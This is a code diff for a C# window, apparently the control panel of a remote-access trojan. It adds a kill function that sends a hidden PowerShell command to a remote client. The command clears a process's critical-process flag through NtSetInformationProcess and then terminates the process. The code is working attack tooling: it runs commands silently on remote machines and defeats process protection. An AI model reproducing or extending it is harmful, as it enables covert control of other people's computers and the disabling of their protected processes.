@@ -61,9 +61,31 @@ public partial class TcpManagerWindow : Window
         await Refresh();
     }
 
-    private void KillProc_Click(object s, RoutedEventArgs e)
+    private async void KillProc_Click(object s, RoutedEventArgs e)
     {
-        // Send kill via remote shell
+        if (GridTcp.SelectedItem is not TcpEntryVM row || row.Pid <= 0) return;
+        if (MessageBox.Show($"Kill process '{row.ProcessName}' (PID {row.Pid})?",
+            "Confirm", MessageBoxButton.YesNo, MessageBoxImage.Warning) != MessageBoxResult.Yes) return;
+
+        // Remove DACL (critical-process flag) then kill
+        var cmd = $"powershell -NoP -NonI -W H -Command \"" +
+                  $"Add-Type -TypeDefinition @'`n" +
+                  $"using System.Runtime.InteropServices;`n" +
+                  $"public class PK {{`n" +
+                  $"[DllImport(\\\"ntdll.dll\\\")] public static extern int NtSetInformationProcess(System.IntPtr h,int c,ref uint v,int s);`n" +
+                  $"[DllImport(\\\"kernel32.dll\\\",SetLastError=true)] public static extern System.IntPtr OpenProcess(uint a,bool i,int p);`n" +
+                  $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool TerminateProcess(System.IntPtr h,uint c);`n" +
+                  $"[DllImport(\\\"kernel32.dll\\\")] public static extern bool CloseHandle(System.IntPtr h);`n" +
+                  $"}}`n" +
+                  $"'@ -ErrorAction SilentlyContinue;" +
+                  $"$h=[PK]::OpenProcess(0x1FFFFF,$false,{row.Pid});" +
+                  $"if($h -ne [IntPtr]::Zero){{$z=[uint32]0;[PK]::NtSetInformationProcess($h,0x1D,[ref]$z,4)|Out-Null;" +
+                  $"[PK]::TerminateProcess($h,0)|Out-Null;[PK]::CloseHandle($h)|Out-Null}}\"";
+
+        await _server.SendToClient(_clientId, new Packet { Type = PacketType.AutoTaskShell, Data = cmd });
+        TxtStatus.Text = $"Kill sent → PID {row.Pid} ({row.ProcessName})";
+        await Task.Delay(600);
+        await Refresh();
     }
 
     private void Window_MouseLeftButtonDown(object s, MouseButtonEventArgs e)
